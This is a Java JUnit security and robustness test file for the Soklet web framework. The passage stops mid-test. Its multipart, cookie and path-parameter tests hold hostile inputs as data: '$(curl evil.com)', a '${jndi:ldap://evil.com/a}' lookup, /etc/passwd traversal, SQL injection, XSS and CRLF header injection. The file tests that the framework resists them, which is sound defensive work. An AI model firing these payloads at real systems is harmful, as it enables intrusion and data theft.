/*
 * Copyright 2022-2025 Revetware LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.soklet;

import com.soklet.Request.PathBuilder;
import com.soklet.annotation.GET;
import com.soklet.annotation.POST;
import com.soklet.annotation.PathParameter;
import com.soklet.annotation.RequestBody;
import com.soklet.annotation.ServerSentEventSource;
import com.soklet.converter.ValueConversionException;
import com.soklet.converter.ValueConverterRegistry;
import com.soklet.exception.IllegalRequestBodyException;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;

import javax.annotation.Nonnull;
import java.io.IOException;
import java.io.InputStream;
import java.lang.ref.WeakReference;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import static java.lang.String.format;

/**
 * @author <a href="https://www.revetkn.com">Mark Allen</a>
 */
public class AdvancedTests {

	// ==================== SSE Connection Race Conditions ====================

	@Test
	public void testSSERaceConditionOnConcurrentConnectionsAndDisconnections() throws Exception {
		// This test attempts to trigger race conditions in SSE connection management
		// by rapidly connecting and disconnecting multiple clients concurrently

		Server server = Server.withPort(findFreePort()).build();
		ServerSentEventServer sseServer = ServerSentEventServer.withPort(findFreePort())
				.concurrentConnectionLimit(100)
				.heartbeatInterval(Duration.ofMillis(100))
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.serverSentEventServer(sseServer)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(SSETestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			// Simulate multiple concurrent connections
			ExecutorService executor = Executors.newFixedThreadPool(50);
			CountDownLatch startLatch = new CountDownLatch(1);
			AtomicInteger connectionErrors = new AtomicInteger(0);
			AtomicInteger successfulConnections = new AtomicInteger(0);

			List<Future<?>> futures = new ArrayList<>();

			for (int i = 0; i < 100; i++) {
				final int clientId = i;
				futures.add(executor.submit(() -> {
					try {
						startLatch.await();

						// Simulate SSE connection
						Request request = Request.withPath(HttpMethod.GET, "/events")
								.headers(Map.of("Accept", Set.of("text/event-stream")))
								.build();

						// In a real scenario, this would be an actual HTTP connection
						// Here we're testing the internal handling
						Thread.sleep(ThreadLocalRandom.current().nextInt(10, 100));

						successfulConnections.incrementAndGet();

						// Simulate abrupt disconnection
						if (clientId % 3 == 0) {
							Thread.sleep(ThreadLocalRandom.current().nextInt(10, 50));
							// Force disconnect
						}
					} catch (Exception e) {
						connectionErrors.incrementAndGet();
					}
				}));
			}

			startLatch.countDown(); // Start all threads simultaneously

			// Wait for all operations to complete
			for (Future<?> future : futures) {
				try {
					future.get(10, TimeUnit.SECONDS);
				} catch (TimeoutException e) {
					// Connection hung - this indicates a deadlock or race condition
					Assertions.fail("SSE connection operation timed out - possible deadlock");
				}
			}

			executor.shutdown();

			// Verify no errors occurred
			Assertions.assertEquals(0, connectionErrors.get(), "Connection errors detected");

			// Give time for cleanup
			Thread.sleep(500);

			// Verify all connections were properly cleaned up
			// This would require access to internal state, but in practice
			// we'd check for memory leaks or orphaned connections
		}
	}

	@Test
	public void testPathNormalizationEdgeCases() {
		// Test edge cases in path normalization
		Map<String, String> testCases = new HashMap<>();
		testCases.put("", "/");
		testCases.put("//multiple///slashes////", "/multiple/slashes");
		testCases.put("/trailing/", "/trailing");
		testCases.put("/%00/null-byte", "/"); // Null byte should be handled
		testCases.put("/\\/backslash", "/\\/backslash");
		testCases.put("/unicode/\u0000/null", "/unicode/"); // Unicode null

		for (Map.Entry<String, String> testCase : testCases.entrySet()) {
			String input = testCase.getKey();
			String expected = testCase.getValue();

			try {
				String result = Utilities.extractPathFromUrl(input, true);
				// Some edge cases might not match exactly but should be safe
				Assertions.assertNotNull(result, "Normalization returned null for: " + input);
				Assertions.assertTrue(result.startsWith("/"), "Result should start with /");
			} catch (Exception e) {
				Assertions.fail("Exception during normalization of: " + input + " - " + e.getMessage());
			}
		}
	}

	// ==================== Cookie Parsing Edge Cases ====================

	@Test
	public void testCookieParsingWithEscapedQuotes() {
		// Test cookie parsing with complex escaped sequences
		String[] cookieHeaders = {
				"name=\"value with \\\"escaped quotes\\\"\"",
				"name=\"value with \\\\backslash\\\\\"",
				"name=\"value with \\;semicolon\\;\"",
				"malformed=\"unclosed quote",
				"name=\"value with \nnewline\"",
				"name=value; name2=\"quoted;with;semicolons\"",
				"name=\"\"; empty=\"\"",
				"unicode=\"\u0000\u0001\u0002\"",
				"name=\"value with \\x00 null byte\""
		};

		try {
			Map<String, Set<String>> cookies = Utilities.extractHeadersFromRawHeaderLines(Arrays.asList(cookieHeaders));

			// Verify parsing doesn't crash
			Assertions.assertNotNull(cookies, "Cookie parsing returned null");

			// For quoted values, verify quotes are properly handled
			for (Map.Entry<String, Set<String>> entry : cookies.entrySet()) {
				String name = entry.getKey();
				Set<String> values = entry.getValue();

				for (String value : values) {
					// Value should not contain unescaped quotes
					if (value.startsWith("\"") && value.endsWith("\"")) {
						Assertions.fail("Cookie value still has surrounding quotes: " + value);
					}
				}
			}

		} catch (Exception e) {
			// Some malformed cookies should be handled gracefully
			System.out.println("Cookie parsing exception (may be expected): " + e.getMessage());
		}
	}

	@Test
	public void testCookieInjectionAttack() {
		// Test for cookie injection vulnerabilities
		String[] injectionAttempts = {
				"sessionid=abc123; admin=true",
				"sessionid=abc123\r\nSet-Cookie: admin=true",
				"sessionid=abc123%0D%0ASet-Cookie:%20admin=true",
				"sessionid=abc123; $Domain=.evil.com",
				"sessionid=abc123; Path=/; Domain=.evil.com; admin=true"
		};

		Map<String, Set<String>> cookies = Utilities.extractHeadersFromRawHeaderLines(Arrays.asList(injectionAttempts));

		// Verify no extra cookies were injected
		Assertions.assertTrue(
				cookies.size() <= 2, // Should only have expected cookies
				"Cookie injection may have succeeded with: " + injectionAttempts
		);

		// Verify no admin cookie was injected
		Assertions.assertFalse(
				cookies.containsKey("admin"),
				"Admin cookie was injected"
		);
	}

	// ==================== Multipart Boundary Validation ====================

	@Test
	public void testMultipartBoundaryValidation() {
		// Test various malicious boundary values
		String[] maliciousBoundaries = {
				"", // Empty boundary
				" ", // Whitespace only
				"a".repeat(1000), // Very long boundary
				"boundary\r\nContent-Type: text/html", // Header injection
				"boundary\u0000", // Null byte
				"--", // Just dashes
				"boundary; filename=\"/etc/passwd\"", // Path injection attempt
				"$(curl evil.com)", // Command injection attempt
				"../../etc/passwd", // Path traversal in boundary
				"boundary\nSet-Cookie: admin=true" // Cookie injection via boundary
		};

		for (String boundary : maliciousBoundaries) {
			try {
				// Create a multipart request with malicious boundary
				String contentType = "multipart/form-data; boundary=" + boundary;
				String body = "--" + boundary + "\r\n" +
						"Content-Disposition: form-data; name=\"field\"\r\n\r\n" +
						"value\r\n" +
						"--" + boundary + "--";

				Request request = Request.withPath(HttpMethod.POST, "/upload")
						.headers(Map.of("Content-Type", Set.of(contentType)))
						.body(body.getBytes(StandardCharsets.UTF_8))
						.build();

				// Attempt to parse - should handle gracefully
				MultipartParser parser = DefaultMultipartParser.defaultInstance();

				try {
					Map<String, Set<MultipartField>> fields = parser.extractMultipartFields(request);

					// If parsing succeeds, verify the boundary was sanitized
					Assertions.assertTrue(
							fields.isEmpty() || boundary.length() < 100,
							"Malicious boundary should have been rejected or sanitized: " + boundary
					);
				} catch (IllegalRequestBodyException e) {
					// Expected for malicious boundaries
				}
			} catch (Exception e) {
				// Should handle errors gracefully
			}
		}
	}

	@Test
	public void testMultipartDoSAttack() {
		// Test DoS via multipart parsing

		// Create a malicious multipart with many small parts
		StringBuilder body = new StringBuilder();
		String boundary = "boundary123";

		// Create 900 small parts - potential DoS
		for (int i = 0; i < 900; i++) {
			body.append("--").append(boundary).append("\r\n");
			body.append("Content-Disposition: form-data; name=\"field").append(i).append("\"\r\n\r\n");
			body.append("x\r\n");
		}
		body.append("--").append(boundary).append("--");

		Request request = Request.withPath(HttpMethod.POST, "/upload")
				.headers(Map.of("Content-Type", Set.of("multipart/form-data; boundary=" + boundary)))
				.body(body.toString().getBytes(StandardCharsets.UTF_8))
				.build();

		MultipartParser parser = DefaultMultipartParser.defaultInstance();

		long startTime = System.currentTimeMillis();
		try {
			Map<String, Set<MultipartField>> fields = parser.extractMultipartFields(request);
			long endTime = System.currentTimeMillis();

			// Parsing should complete in reasonable time
			Assertions.assertTrue(
					(endTime - startTime) < 5000, // Should complete within 5 seconds
					"Multipart parsing took too long - possible DoS vulnerability"
			);

			// There should be limits on number of fields
			Assertions.assertTrue(
					fields.size() < 1000,
					"Too many multipart fields accepted - possible memory DoS"
			);

		} catch (Exception e) {
			// Expected - should reject excessive parts
		}
	}

	// ==================== Additional Security Tests ====================

	@Test
	public void testHeaderInjectionVulnerability() {
		// Test for HTTP header injection vulnerabilities
		String[] injectionAttempts = {
				"value\r\nX-Injected: true",
				"value\nX-Injected: true",
				"value%0D%0AX-Injected:%20true",
				"value\rX-Injected: true",
				"value%0AX-Injected:%20true"
		};

		for (String injection : injectionAttempts) {
			Assertions.assertThrows(IllegalArgumentException.class, () -> {
				Response.withStatusCode(200)
						.headers(Map.of("X-Custom", Set.of(injection)))
						.build();
			}, format("Expected header value '%s' to be caught by sanitizer", injection));
		}
	}

	@Test
	public void testResourceExhaustionViaRegex() {
		// Test for ReDoS (Regular Expression Denial of Service) vulnerabilities
		// Create strings that could cause catastrophic backtracking
		String[] reDoSPatterns = {
				"a".repeat(100) + "X", // For patterns like (a+)+
				"a".repeat(50) + "b".repeat(50), // For alternation patterns
				"x".repeat(1000), // Very long strings
				("a" + "b".repeat(10)).repeat(10) // Nested repetitions
		};

		for (String pattern : reDoSPatterns) {
			long startTime = System.nanoTime();

			// Test various regex-based operations in Soklet
			try {
				// Path normalization
				Utilities.extractPathFromUrl("/" + pattern, true);

				// Cookie parsing
				Utilities.extractHeadersFromRawHeaderLines(List.of("name=" + pattern));

				// Content-type parsing
				Utilities.extractContentTypeFromHeaderValue("text/plain; charset=" + pattern);

			} catch (Exception e) {
				// Exceptions are OK, we're checking for hangs
			}

			long endTime = System.nanoTime();
			long durationMs = (endTime - startTime) / 1_000_000;

			Assertions.assertTrue(
					durationMs < 1000, // Should complete within 1 second
					"Potential ReDoS vulnerability - operation took " + durationMs + "ms"
			);
		}
	}

	// ==================== Concurrency and Thread Safety Tests ====================

	@Test
	public void testConcurrentRequestProcessing() throws Exception {
		// Test thread safety of request processing under high concurrency
		Server server = Server.withPort(findFreePort())
				.requestHandlerExecutorServiceSupplier(() ->
						Utilities.createVirtualThreadsNewThreadPerTaskExecutor("test-thread", (Thread thread, Throwable throwable) -> {
							throwable.printStackTrace();
						}))
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(ConcurrentTestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			int numThreads = 100;
			int requestsPerThread = 100;
			ExecutorService executor = Executors.newFixedThreadPool(numThreads);
			CountDownLatch startLatch = new CountDownLatch(1);
			CountDownLatch doneLatch = new CountDownLatch(numThreads);
			AtomicInteger successCount = new AtomicInteger(0);
			AtomicInteger errorCount = new AtomicInteger(0);
			Set<String> uniqueResponses = Collections.newSetFromMap(new ConcurrentHashMap<>());

			for (int i = 0; i < numThreads; i++) {
				final int threadId = i;
				executor.submit(() -> {
					try {
						startLatch.await();

						for (int j = 0; j < requestsPerThread; j++) {
							String uniqueId = threadId + "-" + j;
							Request request = Request.withPath(HttpMethod.POST, "/concurrent")
									.body(uniqueId.getBytes(StandardCharsets.UTF_8))
									.build();

							Soklet.runSimulator(config, simulator -> {
								MarshaledResponse response = simulator.performRequest(request).getMarshaledResponse();
								if (response.getStatusCode() == 200) {
									String responseBody = new String(
											response.getBody().orElse(new byte[0]),
											StandardCharsets.UTF_8
									);

									// Verify response matches request
									if (responseBody.equals("Processed: " + uniqueId)) {
										successCount.incrementAndGet();
										uniqueResponses.add(responseBody);
									} else {
										errorCount.incrementAndGet();
										System.err.println("Mismatch: expected " + uniqueId +
												" but got " + responseBody);
									}
								} else {
									errorCount.incrementAndGet();
								}
							});
						}
					} catch (Exception e) {
						errorCount.incrementAndGet();
						e.printStackTrace();
					} finally {
						doneLatch.countDown();
					}
				});
			}

			startLatch.countDown(); // Start all threads
			boolean completed = doneLatch.await(30, TimeUnit.SECONDS);

			Assertions.assertTrue(completed, "Test didn't complete in time");
			Assertions.assertEquals(0, errorCount.get(), "Errors occurred during concurrent processing");
			Assertions.assertEquals(numThreads * requestsPerThread, successCount.get(), "Not all requests succeeded");
			Assertions.assertEquals(numThreads * requestsPerThread, uniqueResponses.size(), "Duplicate or missing responses detected");

			executor.shutdown();
		}
	}

	@Test
	public void testRequestBuilderThreadSafety() throws Exception {
		// Test that Request.Builder is not thread-safe (as documented)
		// but that built Request objects are immutable and thread-safe

		PathBuilder builder = Request.withPath(HttpMethod.GET, "/test");
		CountDownLatch latch = new CountDownLatch(1);
		AtomicBoolean builderIsThreadSafe = new AtomicBoolean(true);

		// Try to modify builder from multiple threads (should cause issues)
		int numThreads = 10;
		ExecutorService executor = Executors.newFixedThreadPool(numThreads);

		for (int i = 0; i < numThreads; i++) {
			final int threadId = i;
			executor.submit(() -> {
				try {
					latch.await();
					// Concurrent modifications to builder
					builder.headers(Map.of("Thread-" + threadId, Set.of("value-" + threadId)));
					builder.queryParameters(Map.of("param" + threadId, Set.of("val" + threadId)));
				} catch (Exception e) {
					// Expected - builder is not thread-safe
					builderIsThreadSafe.set(false);
				}
			});
		}

		latch.countDown();
		executor.shutdown();
		executor.awaitTermination(5, TimeUnit.SECONDS);

		// Now test that built Request is immutable and thread-safe
		Request request = Request.withPath(HttpMethod.POST, "/immutable")
				.headers(Map.of("X-Test", Set.of("value")))
				.body("test".getBytes())
				.build();

		CountDownLatch readLatch = new CountDownLatch(1);
		ExecutorService readExecutor = Executors.newFixedThreadPool(50);
		AtomicBoolean requestIsThreadSafe = new AtomicBoolean(true);

		for (int i = 0; i < 50; i++) {
			readExecutor.submit(() -> {
				try {
					readLatch.await();
					// Concurrent reads from request
					for (int j = 0; j < 100; j++) {
						request.getHttpMethod();
						request.getPath();
						request.getHeaders();
						request.getBody();
						request.getCookies();
						request.getQueryParameters();
					}
				} catch (Exception e) {
					requestIsThreadSafe.set(false);
				}
			});
		}

		readLatch.countDown();
		readExecutor.shutdown();
		readExecutor.awaitTermination(5, TimeUnit.SECONDS);

		Assertions.assertTrue(requestIsThreadSafe.get(), "Request object is not thread-safe");
	}

	// ==================== Memory Leak Tests ====================

	@Test
	public void testSSEBroadcasterMemoryLeak() throws Exception {
		// Test that SSE broadcasters don't leak memory when connections are closed
		Server server = Server.withPort(findFreePort()).build();
		ServerSentEventServer sseServer = ServerSentEventServer.withPort(findFreePort())
				.broadcasterCacheCapacity(10) // Small cache to test eviction
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.serverSentEventServer(sseServer)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(SSEMemoryTestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			List<WeakReference<Object>> references = new ArrayList<>();

			// Create many SSE connections and close them
			for (int i = 0; i < 100; i++) {
				ResourcePath path = ResourcePath.withPath("/events/" + i);
				Optional<? extends ServerSentEventBroadcaster> broadcaster =
						sseServer.acquireBroadcaster(path);

				if (broadcaster.isPresent()) {
					// Keep weak reference to check for garbage collection
					references.add(new WeakReference<>(broadcaster.get()));

					// Simulate some events
					broadcaster.get().broadcastEvent(
							ServerSentEvent.withData("test" + i).build()
					);
				}
			}

			// Force garbage collection
			System.gc();
			Thread.sleep(100);
			System.gc();

			// Check that old broadcasters can be garbage collected
			int collected = 0;
			for (WeakReference<Object> ref : references) {
				if (ref.get() == null) {
					collected++;
				}
			}

			// At least some broadcasters should have been collected due to cache eviction
			Assertions.assertTrue(
					collected > 0, "Potential memory leak - broadcasters not being garbage collected. " +
							"Collected: " + collected + " out of " + references.size()
			);

			int broadcastersByResourcePathSize = ((DefaultServerSentEventServer) sseServer).getBroadcastersByResourcePath().size();

			Assertions.assertTrue(broadcastersByResourcePathSize <= 10, "Expected broadcastersByResourcePathSize of <= 10 but was " + broadcastersByResourcePathSize);
		}
	}

	@Test
	public void testLargeRequestBodyMemoryHandling() throws Exception {
		// Test memory handling for large request bodies
		Server server = Server.withPort(findFreePort())
				.maximumRequestSizeInBytes(10 * 1024 * 1024) // 10MB limit
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(LargeBodyTestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			// Track memory usage
			Runtime runtime = Runtime.getRuntime();
			long memoryBefore = runtime.totalMemory() - runtime.freeMemory();

			// Send multiple large requests
			for (int i = 0; i < 10; i++) {
				byte[] largeBody = new byte[5 * 1024 * 1024]; // 5MB
				Arrays.fill(largeBody, (byte) ('A' + i));

				Request request = Request.withPath(HttpMethod.POST, "/large")
						.body(largeBody)
						.build();

				Soklet.runSimulator(config, simulator -> {
					MarshaledResponse response = simulator.performRequest(request).getMarshaledResponse();
					Assertions.assertEquals(200, response.getStatusCode().intValue());
				});
			}

			// Force GC and check memory
			System.gc();
			Thread.sleep(100);
			System.gc();

			long memoryAfter = runtime.totalMemory() - runtime.freeMemory();
			long memoryIncrease = memoryAfter - memoryBefore;

			// Memory increase should be reasonable (not holding onto all bodies)
			Assertions.assertTrue(
					memoryIncrease < 50 * 1024 * 1024, // Less than 50MB increase
					"Excessive memory usage detected. Increase: " +
							(memoryIncrease / 1024 / 1024) + "MB"
			);
		}
	}

	// ==================== Value Converter Edge Cases ====================

	@Test
	public void testCustomValueConverterEdgeCases() {
		ValueConverterRegistry registry = ValueConverterRegistry.withDefaults();

		// Test null handling
		try {
			Optional<Object> result = registry.get(String.class, String.class).get().convert(null);
			Assertions.assertFalse(result.isPresent(), "Null should not convert");
		} catch (Exception e) {
			// Some converters might throw on null
		}

		// Test empty string conversions
		testConversion(registry, "", Integer.class, false);
		testConversion(registry, "", Boolean.class, false);
		testConversion(registry, "", LocalDate.class, false);
		testConversion(registry, " ", Integer.class, false); // Whitespace

		// Test boundary values
		testConversion(registry, String.valueOf(Integer.MAX_VALUE), Integer.class, true);
		testConversion(registry, String.valueOf(Integer.MIN_VALUE), Integer.class, true);
		testConversion(registry, String.valueOf(Long.MAX_VALUE), Integer.class, false); // Overflow

		// Test special float/double values
		testConversion(registry, "NaN", Double.class, true);
		testConversion(registry, "Infinity", Double.class, true);
		testConversion(registry, "-Infinity", Double.class, true);

		// Test malformed inputs
		testConversion(registry, "12.34.56", Double.class, false);
		testConversion(registry, "true false", Boolean.class, false);
		testConversion(registry, "2024-13-45", LocalDate.class, false); // Invalid date
	}

	private void testConversion(ValueConverterRegistry registry, String input,
															Class<?> targetType, boolean shouldSucceed) {
		try {
			Optional<Object> result = registry.get(String.class, targetType).get().convert(input);
			if (shouldSucceed) {
				Assertions.assertTrue(result.isPresent(), "Conversion should succeed for: " + input);
			} else {
				Assertions.assertFalse(result.isPresent(), "Conversion should fail for: " + input);
			}
		} catch (ValueConversionException e) {
			if (shouldSucceed) {
				Assertions.fail("Unexpected conversion exception for: " + input);
			}
		}
	}

	// ==================== Resource Path Matching Edge Cases ====================

	@Test
	public void testResourcePathMatchingEdgeCases() {
		// Test various edge cases in path pattern matching
		Map<String, String> pathPatterns = new HashMap<>();
		pathPatterns.put("/users/{id}", "/users/123");
		pathPatterns.put("/users/{id}/posts/{postId}", "/users/123/posts/456");
		pathPatterns.put("/files/{path:.*}", "/files/docs/report.pdf"); // Wildcard
		pathPatterns.put("/{lang}/docs/{page}", "/en/docs/index");

		for (Map.Entry<String, String> entry : pathPatterns.entrySet()) {
			String pattern = entry.getKey();
			String testPath = entry.getValue();

			ResourcePathDeclaration declaration = ResourcePathDeclaration.withPath(pattern);
			boolean matched = declaration.matches(ResourcePath.withPath(testPath));

			Assertions.assertTrue(matched, "Failed to match pattern: " + pattern + " with path: " + testPath);
		}

		// Test non-matching cases
		Map<String, String> nonMatchingPaths = new HashMap<>();
		nonMatchingPaths.put("/users/{id}", "/users/");
		nonMatchingPaths.put("/users/{id}", "/users/123/extra");
		nonMatchingPaths.put("/api/v{version}/users", "/api/users");

		for (Map.Entry<String, String> entry : nonMatchingPaths.entrySet()) {
			String pattern = entry.getKey();
			String testPath = entry.getValue();

			ResourcePathDeclaration declaration = ResourcePathDeclaration.withPath(pattern);
			boolean matched = declaration.matches(ResourcePath.withPath(testPath));

			Assertions.assertFalse(matched, "Should not match pattern: " + pattern +
					" with path: " + testPath);
		}
	}

	@Test
	public void testPathParameterInjection() {
		// Test that path parameters can't be used for injection attacks
		ResourcePathDeclaration declaration = ResourcePathDeclaration.withPath("/api/{param}");

		String[] injectionAttempts = {
				"../../../etc/passwd",
				"<script>alert('xss')</script>",
				"'; DROP TABLE users; --",
				"${jndi:ldap://evil.com/a}",
				"{{7*7}}",  // Template injection
				"%00",      // Null byte
				"a".repeat(10000) // Very long parameter
		};

		for (String injection : injectionAttempts) {
			String testPath = "/api/" + URLEncoder.encode(injection, StandardCharsets.UTF_8);
			ResourcePath resourcePath = ResourcePath.withPath(testPath);

			// TODO: finish up
//
//			String extractedParam = resourcePath.getPathParameters().get("param");
//
//			// Parameter should be properly decoded/sanitized
//			Assertions.assertNotNull(extractedParam, "Parameter extraction failed");
//
//			// Verify no directory traversal
//			Assertions.assertFalse(extractedParam.contains(".."), "Path traversal in parameter");
		}
	}

	// ==================== Performance and DoS Tests ====================

	@Test
	public void testComputationalComplexityAttacks() {
		// Test for algorithmic complexity attacks

		// Test 1: Many headers with same name
		Map<String, Set<String>> headers = new LinkedHashMap<>();
		Set<String> values = new HashSet<>();
		for (int i = 0; i < 10000; i++) {
			values.add("value" + i);
		}
		headers.put("X-Many", values);

		long start = System.currentTimeMillis();
		Request request = Request.withPath(HttpMethod.GET, "/test")
				.headers(headers)
				.build();
		long duration = System.currentTimeMillis() - start;

		Assertions.assertTrue(duration < 1000, "Header processing too slow: " + duration + "ms");

		// Test 2: Many query parameters
		Map<String, Set<String>> queryParams = new LinkedHashMap<>();
		for (int i = 0; i < 1000; i++) {
			queryParams.put("param" + i, Set.of("value" + i));
		}

		start = System.currentTimeMillis();
		request = Request.withPath(HttpMethod.GET, "/test")
				.queryParameters(queryParams)
				.build();
		duration = System.currentTimeMillis() - start;

		Assertions.assertTrue(duration < 1000,
				"Query parameter processing too slow: " + duration + "ms");
	}

	// ==================== Helper Classes ====================

	public static class ConcurrentTestResource {
		@POST("/concurrent")
		public String handleConcurrent(@RequestBody String data) {
			// Simulate some processing
			try {
				Thread.sleep(ThreadLocalRandom.current().nextInt(1, 10));
			} catch (InterruptedException e) {
				Thread.currentThread().interrupt();
			}
			return "Processed: " + data;
		}
	}

	public static class SSEMemoryTestResource {
		@ServerSentEventSource("/events/{id}")
		public HandshakeResult handleSSE(@PathParameter String id) {
			return HandshakeResult.accept();
		}
	}

	public static class LargeBodyTestResource {
		@POST("/large")
		public Response handleLarge(@RequestBody byte[] body) {
			// Process but don't keep reference to body
			int checksum = Arrays.hashCode(body);
			return Response.withStatusCode(200)
					.body("Processed " + body.length + " bytes, checksum: " + checksum)
					.build();
		}
	}

	public static class TestResource {
		@GET("/test")
		public String test() {
			return "OK";
		}
	}

	public static class SSETestResource {
		@ServerSentEventSource("/events")
		public HandshakeResult handleSSE(Request request) {
			return HandshakeResult.accept();
		}
	}

	private static int findFreePort() throws IOException {
		try (ServerSocket ss = new ServerSocket(0)) {
			ss.setReuseAddress(true);
			return ss.getLocalPort();
		}
	}

	private SokletConfig config(int port) {
		return SokletConfig.withServer(Server.withPort(port).requestTimeout(Duration.ofSeconds(2)).build())
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(TestResource.class)))
				.lifecycleInterceptor(new LifecycleInterceptor() {
					@Override
					public void didReceiveLogEvent(LogEvent e) {} // quiet
				}).build();
	}

	private void write(Socket s, String data) throws Exception {
		s.getOutputStream().write(data.getBytes(StandardCharsets.UTF_8));
	}

	private String readResponse(Socket s) throws Exception {
		InputStream in = s.getInputStream();
		byte[] buf = new byte[1024];
		int n = in.read(buf);
		return n > 0 ? new String(buf, 0, n, StandardCharsets.UTF_8) : "";
	}

	private String firstLine(String resp) {
		return resp.lines().findFirst().orElse("empty");
	}

	@Test
	public void bug_absoluteUriRequestFormIsRejected() throws Exception {
		int port = findFreePort();
		SokletConfig config = config(port);

		try (Soklet app = Soklet.withConfig(config)) {
			app.start();
			try (Socket socket = new Socket("localhost", port)) {
				// RFC 7230: A server MUST accept the absolute-form in requests
				String request = "GET http://localhost:" + port + "/test HTTP/1.1\r\n" +
						"Host: localhost\r\n\r\n";

				write(socket, request);
				String response = readResponse(socket);

				Assertions.assertTrue(response.startsWith("HTTP/1.1 200"),
						"Server rejected absolute URI form: " + firstLine(response));
			}
		}
	}

	@Test
	public void bug_optionsAsteriskIsRejected() throws Exception {
		int port = findFreePort();
		SokletConfig config = config(port);

		try (Soklet app = Soklet.withConfig(config)) {
			app.start();
			try (Socket socket = new Socket("localhost", port)) {
				// Standard server health check
				String request = "OPTIONS * HTTP/1.1\r\n" +
						"Host: localhost\r\n\r\n";

				write(socket, request);
				String response = readResponse(socket);

				Assertions.assertFalse(response.startsWith("HTTP/1.1 500"), "Server did not handle OPTIONS *");
			}
		}
	}

	@Test
	public void security_nullByteInjectionIsAllowed() throws Exception {
		int port = findFreePort();
		SokletConfig config = config(port);

		try (Soklet app = Soklet.withConfig(config)) {
			app.start();
			try (Socket socket = new Socket("localhost", port)) {
				// Attack: try to access file with null byte terminator
				String request = "GET /hello%00.png HTTP/1.1\r\n" +
						"Host: localhost\r\n\r\n";

				write(socket, request);
				String response = readResponse(socket);

				Assertions.assertTrue(response.startsWith("HTTP/1.1 400"),
						"Server should reject paths containing null bytes with 400 Bad Request");
			}
		}
	}

	@Test
	public void urlUnicodeTests() {
		Request request = Request.withRawUrl(HttpMethod.GET, "/👁️👄👁️").build();
		Assertions.assertEquals("/👁️👄👁️", request.getPath());
	}

	@Test
	public void testSSEConcurrentConnectionLimitWithCustomResponse() throws Exception {
		// 1. Setup an SSE server with a STRICT limit of 1 connection
		// We assume findFreePort() is available in your test suite
		int ssePort = findFreePort();
		ServerSentEventServer sseServer = ServerSentEventServer.withPort(ssePort)
				.concurrentConnectionLimit(1)
				.build();

		// 2. Define a custom ResponseMarshaler to verify we can control the 503 output
		ResponseMarshaler customMarshaler = ResponseMarshaler.withDefaults()
				.serviceUnavailableHandler((request, resourceMethod) ->
						MarshaledResponse.withStatusCode(503)
								.headers(Map.of("X-Soklet-Overload", Set.of("true")))
								.body("Custom Overload Message".getBytes(StandardCharsets.UTF_8))
								.build()
				)
				.build();

		// 3. Configure Soklet
		SokletConfig config = SokletConfig.withServer(Server.withPort(findFreePort()).build())
				.serverSentEventServer(sseServer)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(LimitTestResource.class)))
				.responseMarshaler(customMarshaler)
				.lifecycleInterceptor(new LifecycleInterceptor() {
					@Override
					public void didReceiveLogEvent(@Nonnull LogEvent logEvent) {
						// Ignore the SERVER_SENT_EVENT_SERVER_CONNECTION_REJECTED log event
					}
				})
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			String sseUrl = "http://localhost:" + ssePort + "/limit-test";
			CountDownLatch clientAConnected = new CountDownLatch(1);

			// 4. Client A: Occupy the ONLY available slot
			// We run this in a thread because the SSE connection stays open indefinitely
			Thread clientAThread = new Thread(() -> {
				try {
					java.net.http.HttpClient client = java.net.http.HttpClient.newHttpClient();
					java.net.http.HttpRequest request = java.net.http.HttpRequest.newBuilder()
							.uri(URI.create(sseUrl))
							.build();

					// Use a line subscriber to detect when we've successfully connected
					client.send(request, HttpResponse.BodyHandlers.ofLines())
							.body()
							.forEach(line -> {
								// Signal that Client A has successfully taken the slot
								if (line.contains("connected"))
									clientAConnected.countDown();
							});
				} catch (Exception ignored) {
					// Client A will be killed when we close the server, which is expected
				}
			});
			clientAThread.start();

			// Wait for Client A to be fully established before trying Client B
			Assertions.assertTrue(clientAConnected.await(5, TimeUnit.SECONDS), "Client A failed to connect");

			// 5. Client B: Attempt to connect (Should be REJECTED)
			HttpClient clientB = HttpClient.newHttpClient();
			HttpRequest requestB = HttpRequest.newBuilder()
					.uri(URI.create(sseUrl))
					.build();

			HttpResponse<String> responseB = clientB.send(requestB, HttpResponse.BodyHandlers.ofString());

			// 6. Verify assertions
			Assertions.assertEquals(503, responseB.statusCode(),
					"Expected 503 Service Unavailable");

